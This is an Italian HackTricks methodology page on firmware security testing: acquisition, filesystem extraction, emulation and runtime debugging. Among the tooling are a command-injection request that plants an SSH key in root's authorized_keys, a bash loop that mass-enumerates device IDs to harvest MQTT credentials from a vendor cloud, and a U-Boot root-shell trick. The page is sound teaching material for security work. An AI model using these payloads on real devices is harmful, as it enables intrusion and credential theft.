# Analisi del firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introduzione**

### Risorse correlate


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Il firmware è il software essenziale che permette ai dispositivi di funzionare correttamente gestendo e facilitando la comunicazione tra i componenti hardware e il software con cui gli utenti interagiscono. Viene memorizzato in memoria permanente, assicurando che il dispositivo possa accedere a istruzioni vitali dal momento dell'accensione, fino all'avvio del sistema operativo. Esaminare e potenzialmente modificare il firmware è un passaggio critico per identificare vulnerabilità di sicurezza.

## **Raccolta informazioni**

La **raccolta informazioni** è un passo iniziale fondamentale per comprendere la composizione di un dispositivo e le tecnologie che utilizza. Questo processo comporta la raccolta di dati su:

- l'architettura CPU e il sistema operativo su cui gira
- dettagli del bootloader
- layout hardware e datasheet
- metriche della codebase e posizioni del sorgente
- librerie esterne e tipi di licenza
- cronologia degli aggiornamenti e certificazioni normative
- diagrammi architetturali e di flusso
- valutazioni di sicurezza e vulnerabilità identificate

A tal fine, gli strumenti di **open-source intelligence (OSINT)** sono inestimabili, così come l'analisi di qualsiasi componente software open-source disponibile tramite revisioni manuali e automatizzate. Strumenti come [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) offrono analisi statica gratuite che possono essere sfruttate per trovare potenziali problemi.

## **Ottenere il firmware**

Ottenere il firmware può essere affrontato attraverso vari metodi, ciascuno con il proprio livello di complessità:

- **Direttamente** dalla fonte (developers, manufacturers)
- **Compilandolo** dalle istruzioni fornite
- **Scaricandolo** dai siti di supporto ufficiali
- Utilizzando query **Google dork** per trovare file firmware ospitati
- Accedendo direttamente allo **cloud storage**, con strumenti come [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercettando **updates** via tecniche man-in-the-middle
- **Estraendolo** dal dispositivo tramite connessioni come **UART**, **JTAG**, o **PICit**
- **Sniffando** le richieste di update nelle comunicazioni del dispositivo
- Identificando e usando endpoint di update hardcoded
- **Dumping** dal bootloader o dalla rete
- **Rimuovendo e leggendo** il chip di storage, quando tutto il resto fallisce, usando gli strumenti hardware appropriati

### UART-only logs: force a root shell via U-Boot env in flash

Se UART RX viene ignorato (solo log), puoi comunque forzare una shell di init modificando offline il blob dell'environment di U-Boot:

1. Dump dello SPI flash con una SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Individua la partizione U-Boot env, modifica `bootargs` per includere `init=/bin/sh`, e **ricalcola il CRC32 dell'env di U-Boot** per il blob.
3. Reflasha solo la partizione env e riavvia; una shell dovrebbe apparire su UART.

Questo è utile su dispositivi embedded dove la shell del bootloader è disabilitata ma la partizione env è scrivibile tramite accesso esterno alla flash.

## Analizzare il firmware

Ora che **hai il firmware**, devi estrarre informazioni su di esso per sapere come trattarlo. Strumenti diversi che puoi usare per questo:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Se non trovi molto con quegli strumenti controlla la **entropia** dell'immagine con `binwalk -E <bin>`, se l'entropia è bassa, allora probabilmente non è criptata. Se l'entropia è alta, è probabile che sia criptata (o compressa in qualche modo).

Inoltre, puoi usare questi strumenti per estrarre **file incorporati nel firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oppure [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) per ispezionare il file.

### Ottenere il filesystem

Con gli strumenti precedentemente menzionati come `binwalk -ev <bin>` dovresti essere stato in grado di **estrarre il filesystem**.\
Binwalk di solito lo estrae all'interno di una **cartella nominata in base al tipo di filesystem**, che solitamente è uno dei seguenti: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Estrazione manuale del filesystem

A volte, binwalk **non ha il byte magico del filesystem nelle sue firme**. In questi casi, usa binwalk per **trovare l'offset del filesystem e ritagliare il filesystem compresso** dal binario e **estrarre manualmente** il filesystem in base al suo tipo seguendo i passaggi sotto.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Esegui il seguente **dd command** per il carving del filesystem Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
In alternativa, può essere eseguito anche il seguente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Per squashfs (usato nell'esempio sopra)

`$ unsquashfs dir.squashfs`

I file si troveranno poi nella directory "`squashfs-root`".

- Per file archivio CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Per filesystem jffs2

`$ jefferson rootfsfile.jffs2`

- Per filesystem ubifs con NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisi del firmware

Una volta ottenuto il firmware, è essenziale analizzarlo per comprenderne la struttura e le potenziali vulnerabilità. Questo processo prevede l'utilizzo di vari strumenti per analizzare ed estrarre dati utili dall'immagine del firmware.

### Strumenti per l'analisi iniziale

Di seguito è fornito un insieme di comandi per l'ispezione iniziale del file binario (indicato come `<bin>`). Questi comandi aiutano a identificare i tipi di file, estrarre stringhe, analizzare dati binari e comprendere i dettagli di partizioni e filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Per valutare lo stato di cifratura dell'immagine, si controlla l'**entropy** con `binwalk -E <bin>`. Un'entropia bassa suggerisce l'assenza di cifratura, mentre un'entropia alta indica una possibile cifratura o compressione.

Per estrarre i **embedded files**, si consigliano strumenti e risorse come la documentazione **file-data-carving-recovery-tools** e **binvis.io** per l'ispezione dei file.

### Estrazione del Filesystem

Usando `binwalk -ev <bin>`, di solito si può estrarre il filesystem, spesso in una directory nominata in base al tipo di filesystem (es., squashfs, ubifs). Tuttavia, quando **binwalk** non riesce a riconoscere il tipo di filesystem a causa della mancanza dei magic bytes, è necessaria un'estrazione manuale. Questo comporta l'uso di `binwalk` per individuare l'offset del filesystem, seguito dal comando `dd` per ritagliare il filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Successivamente, a seconda del tipo di filesystem (es. squashfs, cpio, jffs2, ubifs), vengono usati comandi diversi per estrarre manualmente i contenuti.

### Analisi del filesystem

Con il filesystem estratto, inizia la ricerca di vulnerabilità. Si presta attenzione a daemon di rete insicuri, credenziali hardcoded, endpoint API, funzionalità di update server, codice non compilato, script di avvio e binari compilati per analisi offline.

**Posizioni chiave** e **elementi** da ispezionare includono:

- **etc/shadow** e **etc/passwd** per le credenziali utente
- Certificati e chiavi SSL in **etc/ssl**
- File di configurazione e script per potenziali vulnerabilità
- Binari embedded per analisi ulteriori
- Web server comuni dei dispositivi IoT e binari

Diversi strumenti aiutano a scoprire informazioni sensibili e vulnerabilità all'interno del filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) per la ricerca di informazioni sensibili
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) per analisi firmware completa
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), e [**EMBA**](https://github.com/e-m-b-a/emba) per analisi statica e dinamica

### Controlli di sicurezza sui binari compilati

Sia il codice sorgente sia i binari compilati trovati nel filesystem devono essere esaminati per vulnerabilità. Strumenti come **checksec.sh** per i binari Unix e **PESecurity** per i binari Windows aiutano a identificare binari non protetti che potrebbero essere sfruttati.

## Estrazione della config cloud e delle credenziali MQTT tramite token URL derivati

Molti IoT hub recuperano la configurazione per dispositivo da un endpoint cloud che appare come:

- `https://<api-host>/pf/<deviceId>/<token>`

Durante l'analisi del firmware potresti trovare che `<token>` viene derivato localmente dall'ID del dispositivo usando un segreto hardcoded, ad esempio:

- token = MD5( deviceId || STATIC_KEY ) e rappresentato come esadecimale maiuscolo

Questo design permette a chiunque venga a conoscenza del deviceId e del STATIC_KEY di ricostruire l'URL e ottenere la cloud config, rivelando spesso credenziali MQTT in chiaro e prefissi di topic.

Flusso di lavoro pratico:

1) Estrarre il deviceId dai log di boot UART

- Collegare un adattatore UART 3.3V (TX/RX/GND) e acquisire i log:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Cerca le righe che stampano il pattern dell'URL della cloud config e l'indirizzo del broker, ad esempio:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperare STATIC_KEY e l'algoritmo del token dal firmware

- Caricare i binari in Ghidra/radare2 e cercare il percorso di configurazione ("/pf/") o l'uso di MD5.
- Confermare l'algoritmo (es., MD5(deviceId||STATIC_KEY)).
- Derivare il token in Bash e convertire il digest in maiuscolo:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Raccogli configurazione cloud e credenziali MQTT

- Componi l'URL e scarica il JSON con curl; analizzalo con jq per estrarre i segreti:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abusare di plaintext MQTT e di ACLs dei topic deboli (se presenti)

- Usare recovered credentials per sottoscriversi ai maintenance topics e cercare eventi sensibili:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerare ID dispositivo prevedibili (su larga scala, con autorizzazione)

- Molti ecosistemi incorporano byte OUI del produttore/prodotto/tipo seguiti da un suffisso sequenziale.
- Puoi iterare ID candidati, derivare token e recuperare configurazioni in modo programmatico:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Note
- Ottieni sempre un'autorizzazione esplicita prima di tentare enumerazioni di massa.
- Preferisci l'emulazione o l'analisi statica per recuperare segreti senza modificare l'hardware target quando possibile.


Il processo di emulazione del firmware consente la **dynamic analysis** sia del funzionamento di un dispositivo sia di un singolo programma. Questo approccio può incontrare difficoltà legate a dipendenze hardware o architetturali, ma trasferire il root filesystem o specifici binaries su un dispositivo con architettura e endianness corrispondenti, come un Raspberry Pi, o su una virtual machine preconfigurata, può facilitare ulteriori test.

### Emulazione di singoli binaries

Per esaminare programmi singoli, è cruciale identificare l'endianness e l'architettura della CPU del programma.

#### Esempio con architettura MIPS

Per emulare un binary con architettura MIPS, è possibile usare il comando:
```bash
file ./squashfs-root/bin/busybox
```
E per installare gli strumenti di emulazione necessari:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Per MIPS (big-endian) si usa `qemu-mips`, mentre per i binari little-endian la scelta è `qemu-mipsel`.

#### Emulazione dell'architettura ARM

Per i binari ARM il processo è simile, con l'emulator `qemu-arm` utilizzato per l'emulazione.

### Emulazione completa del sistema

Strumenti come [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) e altri facilitano l'emulazione completa del firmware, automatizzando il processo e supportando l'analisi dinamica.

## Analisi dinamica nella pratica

A questo punto, per l'analisi si usa un ambiente con dispositivo reale o emulato. È essenziale mantenere l'accesso alla shell dell'OS e al filesystem. L'emulazione potrebbe non riprodurre perfettamente le interazioni hardware, rendendo necessari riavvii dell'emulazione. L'analisi dovrebbe riesaminare il filesystem, sfruttare pagine web esposte e servizi di rete, ed esplorare vulnerabilità del bootloader. I test di integrità del firmware sono critici per identificare potenziali backdoor.

## Tecniche di analisi runtime

L'analisi a runtime implica l'interazione con un processo o un binario nel suo ambiente operativo, usando strumenti come gdb-multiarch, Frida e Ghidra per impostare breakpoints e identificare vulnerabilità tramite fuzzing e altre tecniche.

Per target embedded senza un debugger completo, **copiare un `gdbserver` compilato staticamente** sul dispositivo e collegarsi da remoto:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
## Sfruttamento binario e Proof-of-Concept

Sviluppare un PoC per vulnerabilità identificate richiede una profonda comprensione dell'architettura target e della programmazione in linguaggi di basso livello. Le protezioni a runtime binarie nei sistemi embedded sono rare, ma quando presenti possono essere necessarie tecniche come Return Oriented Programming (ROP).

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc uses fastbins similar to glibc. A later large allocation can trigger `__malloc_consolidate()`, so any fake chunk must survive checks (sane size, `fd = 0`, and surrounding chunks seen as "in use").
- **Non-PIE binaries under ASLR:** if ASLR is enabled but the main binary is **non-PIE**, in-binary `.data/.bss` addresses are stable. You can target a region that already resembles a valid heap chunk header to land a fastbin allocation on a **function pointer table**.
- **Parser-stopping NUL:** when JSON is parsed, a `\x00` in the payload can stop parsing while keeping trailing attacker-controlled bytes for a stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** a ROP chain that calls `open("/proc/self/mem")`, `lseek()`, and `write()` can plant executable shellcode in a known mapping and jump to it.

## Sistemi operativi preparati per l'analisi del firmware

Operating systems like [AttifyOS](https://github.com/adi0x90/attifyos) and [EmbedOS](https://github.com/scriptingxss/EmbedOS) provide pre-configured environments for firmware security testing, equipped with necessary tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS è una distro pensata per aiutarti a eseguire security assessment e penetration testing di dispositivi Internet of Things (IoT). Ti fa risparmiare molto tempo fornendo un ambiente pre-configurato con tutti gli strumenti necessari.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system based on Ubuntu 18.04 preloaded with firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Anche quando un vendor implementa controlli di firma crittografica per le immagini firmware, la **protezione contro il version rollback (downgrade) è frequentemente omessa**. Quando il boot- o recovery-loader verifica solo la firma con una chiave pubblica embedded ma non confronta la *versione* (o un contatore monotono) dell'immagine che viene flashata, un attacker può installare legittimamente un **firmware più vecchio e vulnerabile che porta ancora una firma valida** e quindi re-introdurre vulnerabilità già patchate.

Tipico flusso di attacco:

1. **Obtain an older signed image**
* Grab it from the vendor’s public download portal, CDN or support site.
* Extract it from companion mobile/desktop applications (e.g. inside an Android APK under `assets/firmware/`).
* Retrieve it from third-party repositories such as VirusTotal, Internet archives, forums, etc.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Many consumer IoT devices expose *unauthenticated* HTTP(S) endpoints that accept Base64-encoded firmware blobs, decode them server-side and trigger recovery/upgrade.
3. After the downgrade, exploit a vulnerability that was patched in the newer release (for example a command-injection filter that was added later).
4. Optionally flash the latest image back or disable updates to avoid detection once persistence is gained.

### Esempio: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Nel firmware vulnerabile (downgraded), il parametro `md5` viene concatenato direttamente in un comando shell senza sanitizzazione, consentendo l'injection di comandi arbitrari (qui — abilitazione dell'accesso root basato su chiave SSH). Versioni successive del firmware hanno introdotto un filtro di caratteri di base, ma l'assenza di protezione da downgrade rende la correzione inutile.

### Estrazione del firmware dalle app mobili

Molti fornitori includono immagini firmware complete all'interno delle loro app companion in modo che l'app possa aggiornare il dispositivo via Bluetooth/Wi-Fi. Questi pacchetti sono comunemente memorizzati non criptati nell'APK/APEX sotto percorsi come `assets/fw/` o `res/raw/`. Strumenti come `apktool`, `ghidra`, o anche il semplice `unzip` permettono di estrarre immagini firmate senza toccare l'hardware fisico.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Lista di controllo per valutare la logica di aggiornamento

* Il trasporto/l'autenticazione dell'*update endpoint* è adeguatamente protetto (TLS + autenticazione)?
* Il dispositivo confronta **numeri di versione** o un **contatore monotono anti-rollback** prima del flashing?
* L'immagine viene verificata all'interno di una catena di secure boot (es. firme controllate dal ROM code)?
* Il codice userland esegue ulteriori controlli di validità (es. allowed partition map, model number)?
* I flussi di update *partial* o *backup* riutilizzano la stessa logica di validazione?

> 💡  Se uno qualsiasi dei punti sopra manca, la piattaforma è probabilmente vulnerabile ad attacchi di rollback.

## Vulnerable firmware to practice

Per esercitarsi nel trovare vulnerabilità nei firmware, usa i seguenti progetti di firmware vulnerabili come punto di partenza.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Formazione e certificazioni

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Riferimenti

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)

{{#include ../../banners/hacktricks-training.md}}
